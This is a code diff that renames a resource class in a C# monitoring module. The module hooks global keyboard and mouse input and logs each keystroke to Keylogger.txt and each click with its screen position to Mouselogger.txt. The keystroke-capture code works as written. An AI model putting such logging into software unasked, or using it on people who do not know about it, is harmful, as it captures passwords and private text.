@@ -12,15 +12,15 @@ namespace RBS.Monitoring_Engine
         public static void InitialiseUserInputMonitoring()
         {
            
-            GlobalResources.UserInputMonitoringIsOn += GlobalResources_UserInputMonitoringIsOn;
-            GlobalResources.UserInputMonitoringIsOff += GlobalResources_UserInputMonitoringIsOff;
+            AppResources.UserInputMonitoringIsOn += AppResources_UserInputMonitoringIsOn;
+            AppResources.UserInputMonitoringIsOff += AppResources_UserInputMonitoringIsOff;
         }
 
-        private static void GlobalResources_UserInputMonitoringIsOn(object sender, System.EventArgs e)
+        private static void AppResources_UserInputMonitoringIsOn(object sender, System.EventArgs e)
         {
             StartUIM();
         }
-        private static void GlobalResources_UserInputMonitoringIsOff(object sender, System.EventArgs e)
+        private static void AppResources_UserInputMonitoringIsOff(object sender, System.EventArgs e)
         {
             StopUIM();
         }
@@ -35,16 +35,16 @@ namespace RBS.Monitoring_Engine
        
         private static void GlobalHookKeyPress(object sender, System.Windows.Forms.KeyPressEventArgs e)
         {
-            using (StreamWriter writer = new StreamWriter(GlobalResources.Path + @"Keylogger.txt", true))
+            using (StreamWriter writer = new StreamWriter(AppResources.Path + @"Keylogger.txt", true))
             {
                 writer.Write(e.KeyChar);
             }
-            GlobalResources.NewKeyStrokesHasCaptured();
+            AppResources.NewKeyStrokesHasCaptured();
         }
 
         private static void GlobalHookMouseDownExt(object sender, MouseEventExtArgs e)
         {
-            using (StreamWriter writer = new StreamWriter(GlobalResources.Path + "Mouselogger.txt", true))
+            using (StreamWriter writer = new StreamWriter(AppResources.Path + "Mouselogger.txt", true))
             {
                 writer.Write("Button : " + e.Button.ToString() + "\t");
                 writer.Write("\tLocation : "+ e.Location.ToString() + "\t");
@@ -52,7 +52,7 @@ namespace RBS.Monitoring_Engine
                 writer.Write("\tWheelScrolled : " + e.Timestamp.ToString() + "\t");
                 writer.Write("\n");
             }
-            GlobalResources.NewMouseStrokesHasCaptured();
+            AppResources.NewMouseStrokesHasCaptured();
         }
 
         public static void StopUIM()
@@ -60,8 +60,8 @@ namespace RBS.Monitoring_Engine
             m_GlobalHook.KeyPress -= GlobalHookKeyPress;
             m_GlobalHook.MouseDownExt -= GlobalHookMouseDownExt;
             m_GlobalHook.Dispose();
-            File.Delete(GlobalResources.Path + "Keylogger.txt");
-            File.Delete(GlobalResources.Path + "Mouselogger.txt");
+            File.Delete(AppResources.Path + "Keylogger.txt");
+            File.Delete(AppResources.Path + "Mouselogger.txt");
         }
     }   
 }
